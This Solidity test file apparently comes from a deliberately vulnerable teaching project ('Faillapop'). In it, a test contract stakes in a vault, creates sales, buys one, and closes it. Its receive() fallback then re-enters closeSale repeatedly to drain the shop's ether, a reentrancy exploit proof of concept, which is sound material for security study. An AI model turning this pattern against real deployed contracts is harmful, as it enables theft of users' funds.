// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
//import {IFP_Shop_reentrancy} from "../../src/interfaces/IFP_Shop_reentrancy.sol";
import {FP_Shop} from "../../src/Faillapop_shop.sol";
import {Test, console} from "forge-std/Test.sol";
import {FP_CoolNFT} from "../../src/Faillapop_CoolNFT.sol";
import {FP_DAO} from "../../src/Faillapop_DAO.sol";
import {FP_PowersellerNFT} from "../../src/Faillapop_PowersellerNFT.sol";
import {FP_Shop} from "../../src/Faillapop_shop.sol";
import {FP_Token} from "../../src/Faillapop_ERC20.sol";
import {FP_Vault} from "../../src/Faillapop_vault.sol";

//based on https://solidity-by-example.org/hacks/re-entrancy/

contract Reentrancy is Test {

    FP_Shop public shop;
    FP_Vault public vault;
    FP_DAO public dao;
    FP_Token public token;
    FP_CoolNFT public coolNFT;
    FP_PowersellerNFT public powersellerNFT;

    address public constant SELLER1 = address(30); // conflicto con primeras direcciones (reservadas internas Ethereum)
    address public constant BUYER1 = address(40);
    address public constant USER1 = address(50);

    address public constant SELLER2 = address(60);
    address public constant SELLER3 = address(70);
    address public constant SELLER4 = address(80);
    address public constant SELLER5 = address(90);

    uint256 public constant AMOUNT = 1 ether;

    modifier createLegitSale() {
        // Simulate an user's stake in the Vault
        vm.prank(SELLER1);
        vault.doStake{value: 2 ether}();

        // New sale 
        string memory title = "Test Item";
        string memory description = "This is a test item";
        uint256 price = 1 ether;        
        vm.prank(SELLER1);
        shop.newSale(title, description, price);
        _;
    }

    modifier createLegitSales() {
        // Simulate an user's stake in the Vault
        vm.prank(SELLER1);
        vault.doStake{value: 11 ether}();

        // New sale 
        string memory title = "Test Item";
        string memory description = "This is a test item";
        uint256 price = 5 ether;        
        vm.prank(SELLER1); //vm.prank solo afecta a la siguiente linea codigo
        shop.newSale(title, description, price);

        vm.prank(SELLER2);
        vault.doStake{value: 11 ether}();

        string memory title2 = "Test Item 2";   
        vm.prank(SELLER2);
        shop.newSale(title, description, price);

        vm.prank(SELLER3);
        vault.doStake{value: 11 ether}();

        string memory title3 = "Test Item 3";
        vm.prank(SELLER3);
        shop.newSale(title, description, price);

        vm.prank(SELLER4);
        vault.doStake{value: 11 ether}();

        string memory title4 = "Test Item 4";      
        vm.prank(SELLER4); 
        shop.newSale(title, description, price);

        //vm.prank(SELLER5);
        vault.doStake{value: 11 ether}(); 
        string memory title5 = "Test Item 5";
        shop.newSale(title, description, price);

        _;
    }

    function setUp() external {
        vm.deal(address(this), 35 ether);
        vm.deal(SELLER1, 15 ether);
        vm.deal(BUYER1, 15 ether);
        vm.deal(USER1, 15 ether);

        vm.deal(SELLER2, 15 ether);
        vm.deal(SELLER3, 15 ether);
        vm.deal(SELLER4, 15 ether);
        vm.deal(SELLER5, 15 ether);

        token = new FP_Token();
        coolNFT = new FP_CoolNFT();
        powersellerNFT = new FP_PowersellerNFT();
        dao = new FP_DAO("password", address(coolNFT), address(token));
        vault = new FP_Vault(address(powersellerNFT), address(dao));
        shop = new FP_Shop(address(dao), address(vault), address(powersellerNFT));
        //shop2 = new FP_Shop(address(dao), address(vault), address(powersellerNFT)); //TODO testing spoof?

        vault.setShop(address(shop));
        dao.setShop(address(shop));
        powersellerNFT.setShop(address(shop));
        coolNFT.setDAO(address(dao));

        vm.deal(address(shop), 20 ether);
    }

    function test_attack() external payable createLegitSales() {
        shop.doBuy{value: 5 ether}(shop.offerIndex()-1);
        shop.closeSale(shop.offerIndex()-1, false, true, true);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {
        if(address(tx.origin).balance >= 1 ether) {
            shop.closeSale(shop.offerIndex()-1, false, true, true);
        }
    }

}